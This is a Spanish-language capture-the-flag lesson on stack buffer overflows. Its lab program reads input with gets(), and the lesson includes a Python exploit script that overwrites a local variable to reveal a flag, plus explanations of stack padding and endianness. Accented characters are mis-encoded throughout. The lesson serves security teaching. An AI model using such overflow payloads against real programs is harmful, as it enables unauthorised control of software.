# Corrupci√≥n de Memoria Basada en la Pila

## Corrupci√≥n

### Corrupci√≥n de Memoria Basada en la Pila

Hemos visto c√≥mo deber√≠a funcionar la pila, pero ¬øqu√© sucede cuando un programador introduce una vulnerabilidad? Este nivel introduce el concepto de **corrupci√≥n de memoria** y muestra c√≥mo un atacante puede aprovechar un error para obtener control total sobre la pila.

### Objetivos de Aprendizaje

- Comprender el concepto de corrupci√≥n de memoria.
- Aprovechar vulnerabilidades para corromper y controlar variables en la pila.

---

## Introducci√≥n

Como un lenguaje relativamente de "bajo nivel", C otorga a los desarrolladores acceso sin restricciones a la memoria en tiempo de ejecuci√≥n de su programa. Cuando un c√≥digo defectuoso hace que un programa acceda a la memoria incorrecta, puede ocurrir **corrupci√≥n de memoria**.

A menudo, la corrupci√≥n de memoria simplemente har√° que un programa se bloquee. Pero, si se utiliza correctamente, un atacante puede usar esta corrupci√≥n para cambiar el comportamiento del programa y realizar acciones m√°s maliciosas.

---

## Expectativas Poco Realistas

Al revisar el c√≥digo fuente proporcionado para esta lecci√≥n, podemos ver que el programa entrar√° en la condici√≥n de √©xito si la variable local `foo` se establece en el valor hexadecimal `0xDEADBEEF0BADC0DE`:

```c
if (foo == 0xDEADBEEF0BADC0DE)
{
    printf("¬°Correcto!\n");
    system("cat flag");
}
```

Pero, ¬øc√≥mo puede esto ser cierto? La variable `foo` solo se inicializa con el valor fijo `0x5151515151515151` y no se modifica en ninguna otra parte del c√≥digo.

```c
uint64_t foo = 0x5151515151515151;
```

Para un programador promedio, este binario parece presentar una condici√≥n imposible de cumplir. Pero para los curiosos, esto est√° lejos de ser imposible.

---

## Desbordamiento de Buffer

Algo muy interesante acaba de suceder. Tu entrada caus√≥ que el programa **desbordara** el `buffer` y **corrompiera** la variable `foo` cercana.

```wdb
Enter data: 
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Un **desbordamiento de buffer** ocurre cuando el n√∫mero de bytes copiados a un buffer excede su tama√±o asignado. Los datos excedentes "desbordar√°n" el buffer, corrompiendo la memoria adyacente.

---

## Inicializaci√≥n en el Depurador

Para explicar mejor el da√±o que puede causar esta corrupci√≥n, estudiaremos el binario a nivel de ensamblador. Comienza colocando un punto de interrupci√≥n en la siguiente direcci√≥n y vuelve a ejecutar el programa:

```wdb
wdb> b * 0x40172c
wdb> run 
```

---

## Inicializaci√≥n de `foo`

En esta instrucci√≥n, podemos ver que el valor de 64 bits `0x5151515151515151` se carga en el registro `rax`. La instrucci√≥n que sigue inmediatamente almacenar√° este valor en la direcci√≥n de memoria `[rbp-0x8]`:

```nasm
mov     rax, 0x5151515151515151
mov     qword [rbp-0x8], rax
```

En la lecci√≥n anterior, aprendimos que `rbp` es el puntero base del marco de pila actual. Por lo tanto, estas dos instrucciones deben estar inicializando la variable local `foo` en la pila. Esto se traduce aproximadamente a la siguiente l√≠nea de c√≥digo en C:

```c
uint64_t foo = 0x5151515151515151;
```

Usa `si` para avanzar paso a paso por estas instrucciones y contin√∫a con la lecci√≥n.

---

## Acerca de `gets()`

La funci√≥n de biblioteca `gets()` es conocida como [get string](http://man7.org/linux/man-pages/man3/gets.3.html). Esta funci√≥n es notoriamente insegura porque no hay forma de restringir cu√°ntos datos leer√° en un buffer dado:

```c
// Leer entrada del usuario desde STDIN a un buffer en la pila
printf("Enter data: ");
gets(buffer);
```

Al usar esta funci√≥n insegura, el programador ha introducido inadvertidamente una **vulnerabilidad** en este binario. Este ejemplo cl√°sico de un **desbordamiento de buffer** puede llevar directamente a la **corrupci√≥n** de datos en la pila.

---

## Escritura del Exploit

Usando Python, puedes escribir un script para explotar esta vulnerabilidad.

```python
import interact
import struct

# Funci√≥n para empaquetar un n√∫mero a 8 bytes en formato little-endian
def p64(n):
    return struct.pack('<Q', n)

# 1. El relleno para llegar hasta 'foo' (32 + 8 = 40 bytes)
padding = b'A' * 40

# 2. El valor que queremos escribir en 'foo', empaquetado con p64()
target_value = p64(0xDEADBEEF0BADC0DE)

# 3. El payload final es la combinaci√≥n de ambos
payload = padding + target_value

# --- Se env√≠a el payload al programa ---
p = interact.Process()
p.readuntil('Enter data: ')
p.sendline(payload)

# Usamos interactive() para ver la salida final del programa,
# que incluir√° la visualizaci√≥n del stack y la flag.
p.interactive()
```

---

### Arquitectura Little Endian

Recuerda que x86 es una arquitectura **little-endian**. Esto significa que los **n√∫meros** se almacenan "al rev√©s" en memoria:

```
N√∫mero de 64 bits: 0x4142434445464748
Bytes en memoria : 48 47 46 45 44 43 42 41
```

Aseg√∫rate de tener esto en cuenta al enviar tu payload. Puedes usar las funciones `p64` y `u64` para automatizar la conversi√≥n.

---

### Resultado Final

```markdown
| Direcci√≥n de Memoria       | Contenido                          | Descripci√≥n                     |
|----------------------------|------------------------------------|---------------------------------|
| 0x7fffffffed90             | 01 00 00 00 00 00 00 00           | Espacio no asignado             |
| 0x7fffffffeda0 (bar)       | 51 52 53 54 55 56 57 58           | Variable `bar`                  |
| 0x7fffffffeda8 (buffer)    | 41 41 41 41 41 41 41 41           | Inicio del buffer               |
| 0x7fffffffedb0             | 41 41 41 41 41 41 41 41           | Continuaci√≥n del buffer         |
| 0x7fffffffedb8             | 41 41 41 41 41 41 41 41           | Continuaci√≥n del buffer         |
| 0x7fffffffedc0             | 41 41 41 41 41 41 41 41           | Continuaci√≥n del buffer         |
| 0x7fffffffedc8 (padding)   | 41 41 41 41 41 41 41 41           | Espacio de relleno (padding)    |
| 0x7fffffffedd0 (foo)       | DE C0 AD 0B EF BE AD DE           | Variable `foo`                  |
| 0x7fffffffedd8             | 00 17 40 00 00 00 00 00           | Direcci√≥n de retorno            |
| ...                        | ...                                | Marco de pila anterior          |
```



Correct!
flag{w3lc0m3_t0_th3_m4g1c4l_w0rld_0f_mem0ry_c0rrupt1on}
```


## Entendiendo un poco m√°s la pila, y el padding.


El relleno de 40 bytes es la **distancia exacta** que necesit√°s "viajar" por la memoria del stack para ir desde el inicio de `buffer` hasta el inicio de `foo`. No es un n√∫mero al azar, sino la suma de dos cosas:
1. el tama√±o del propio buffer.
2. Y un espacio de relleno que el compilador agrega.

## El Mapa del Stack: buffer, padding y foo üó∫Ô∏è

Ac√° se muestra c√≥mo est√°n ordenadas las variables en la memoria:

``` 
           +---------------------------------------+
 buffer -->| ... (32 bytes para tu entrada) ...    |
           +---------------------------------------+
(padding) ->| ... (8 bytes de espacio vac√≠o) ...    |
           +---------------------------------------+
    foo -->| ... (8 bytes para la variable foo) ...|
           +---------------------------------------+
``` 

----

1. El `buffer` (32 bytes): Es el espacio que el programa te reserva. Los primeros 32 bytes de tu payload (b'A' * 40) se usan simplemente para llenar este espacio por completo.

2. El padding del compilador (8 bytes): Despu√©s del buffer, el compilador dej√≥ un "hueco" de 8 bytes. Esto lo hace para mantener las variables alineadas a 8 bytes, (x86_64 otras arquitecturas utilizan otras alineaciones) lo que optimiza el acceso a memoria en sistemas de 64 bits. Los siguientes 8 bytes de tu payload llenan este hueco.

3. La variable foo (8 bytes): Justo despu√©s de ese relleno de 8 bytes, empieza la variable foo.

Sumando ambos tramos: 32 bytes (buffer) + 8 bytes (padding) = 40 bytes. Por eso padding = b'A' * 40 es la cantidad precisa de "basura" que necesit√°s enviar para que el siguiente byte que escribas caiga justo en el primer byte de foo.


## La Inundaci√≥n: C√≥mo Funciona el Relleno üåä (explicaci√≥n para nenes de doce a√±os)

Imagin√° que el buffer es un vaso de 32 ml y foo est√° en una mesa justo al lado. La funci√≥n `gets()` es como una manguera sin canilla que empieza a llenar el vaso con tu payload.

Llenando el buffer: Los primeros 32 bytes de 'A' llenan el vaso hasta el borde.

El Desborde: Como segu√≠s enviando datos, los siguientes 8 bytes de 'A' se desbordan del vaso y cubren los 8 cm de mesa (el padding) que lo separan de foo.

El Objetivo: Despu√©s de 40 bytes, el "agua" (tus datos) est√° justo en el borde de foo. Ahora, los siguientes 8 bytes que env√≠es `(p64(0xDEADBEEF0BADC0DE))` caer√°n directamente sobre foo, cambi√°ndole el valor.

El relleno, entonces, no es para "rellenar la pila" en general, sino para controlar con precisi√≥n hasta d√≥nde llega tu desbordamiento y as√≠ poder escribir el valor exacto en la ubicaci√≥n exacta que quer√©s corromper.

## Entendiendo el endianness

La arquitectura de tu computadora (x86) es little-endian, lo que significa que guarda los n√∫meros de m√°s de un byte en memoria "d√°ndolos vuelta", con el byte menos significativo primero.

### ¬øQu√© es Endianness?
Endianness define el orden en que se almacenan en memoria los bytes que componen un n√∫mero. Existen dos tipos principales:

- Big-Endian: Guarda los bytes en el mismo orden en que los leemos. El byte m√°s significativo (el de la izquierda) se guarda en la direcci√≥n de memoria m√°s baja. Es el sistema m√°s intuitivo para nosotros.
- Little-Endian: Guarda los bytes en orden inverso. El byte menos significativo (el de la derecha) se guarda en la direcci√≥n de memoria m√°s baja. Este es el sistema que usan los procesadores Intel y AMD.

Ejemplo con el n√∫mero 0xDEADBEEF:

| Arquitectura   | Direcci√≥n de Memoria (baja a alta) |
|----------------|------------------------------------|
| Big-Endian     | DE AD BE EF                       |
| Little-Endian  | EF BE AD DE                       |

### Entonces, ¬øpor que afecta al script del exploit?

Cuando cre√°s tu payload, est√°s construyendo una cadena de bytes que se escribir√° en la memoria uno por uno. Si quer√©s que la variable foo contenga el n√∫mero `0xDEADBEEF0BADC0DE`, no pod√©s simplemente escribir los bytes `DE, AD, BE, EF`... en ese orden.
Debido a que la **CPU es little-endian**, ten√©s que enviar los bytes en el orden en que la CPU espera leerlos de la memoria para reconstruir el n√∫mero original. Es decir, ten√©s que "darles la vuelta" vos mismo en el payload.

- N√∫mero deseado: `0xDEADBEEF0BADC0DE`
- Payload que deb√©s enviar: `\xDE\xC0\xAD\x0B\xEF\xBE\xAD\xDE`

